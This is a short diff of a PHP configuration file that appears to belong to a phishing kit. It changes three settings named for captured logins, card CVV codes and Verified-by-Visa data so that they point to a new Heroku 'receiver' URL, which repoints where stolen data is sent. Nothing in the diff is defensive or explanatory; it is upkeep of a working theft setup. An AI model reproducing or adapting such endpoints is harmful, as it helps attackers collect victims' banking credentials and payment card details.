@@ -1,8 +1,8 @@
 <?php
 
-$to_login   = "https://mighty-earth-61830.herokuapp.com/receiver";
-$to_cvv     = "https://mighty-earth-61830.herokuapp.com/receiver";
-$to_vbv     = "https://mighty-earth-61830.herokuapp.com/receiver";
+$to_login   = "https://radiant-anchorage-15034.herokuapp.com/receiver";
+$to_cvv     = "https://radiant-anchorage-15034.herokuapp.com/receiver";
+$to_vbv     = "https://radiant-anchorage-15034.herokuapp.com/receiver";
 
 
 ##ip##
